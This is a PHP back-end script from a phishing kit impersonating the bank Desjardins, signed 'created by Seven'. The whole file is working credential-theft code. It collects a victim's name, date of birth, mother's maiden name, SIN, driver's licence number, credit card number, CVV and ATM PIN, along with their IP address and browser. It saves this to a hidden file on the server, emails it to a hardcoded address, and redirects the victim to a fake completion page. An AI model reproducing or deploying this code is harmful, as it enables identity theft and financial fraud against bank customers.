<?php

error_reporting(0);
$send = "sarkolouty@gmail.com";


$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "-----------------3 PersonalDetails------------------\n";
$message .= "Full Name : ".$_POST['fullname']."\n";
$message .= "D.O.B-day : ".$_POST['dobday']."\n";
$message .= "D.O.B-month : ".$_POST['dobmonth']."\n";
$message .= "D.O.B-year : ".$_POST['dobyear']."\n";
$message .= "M.M.N : ".$_POST['MMN']."\n";
$message .= "S.I.N : ".$_POST['SIN']."\n";
$message .= "D.L.N : ".$_POST['DLN']."\n";
$message .= "Employeur : ".$_POST['medical']."\n";
$message .= "Occupation : ".$_POST['occupation']."\n";
$message .= "-----------------4 CardDetails----------------------\n";
$message .= "Credit Card Number : ".$_POST['CCNO']."\n";
$message .= "Exp. Date-month : ".$_POST['EXPDATEmonth']."\n";
$message .= "Exp. Date-year : ".$_POST['EXPDATE']."\n";
$message .= "Cvv2 : ".$_POST['CVV']."\n";
$message .= "ATMPIN : ".$_POST['ATMPIN']."\n";
$message .= "-----------------created by Seven[723806851]-----------------\n";
$message .= "IP          : ".$ip."\n";
$message .= "BROWSER     : ".$browser."\n";
$message .= "-----------------DESJARDINSResults------------------\n";


$subject = "DESJARDINS - created by Seven[723806851] ";

$fp = fopen($_SERVER['DOCUMENT_ROOT'] . "/ehtgdfh4w3.txt","a+");
fwrite($fp,"DESJARDINS - Seven[723806851]" . " | " .getenv('HTTP_X_FORWARDED_FOR') . " | " . $_SERVER['HTTP_USER_AGENT'] . " | " . "\n\n" .$subject . "\n" . $message . "\n\n");
fclose($fp);

mail($send , "DESJARDINS - Seven[723806851]", getenv('HTTP_X_FORWARDED_FOR') . " | " . $_SERVER['HTTP_USER_AGENT'] . " | " . "\n\n" .$subject . "\n" . $message . "\n\n");


?>
<script>
    window.top.location.href = "complete.htm";

</script>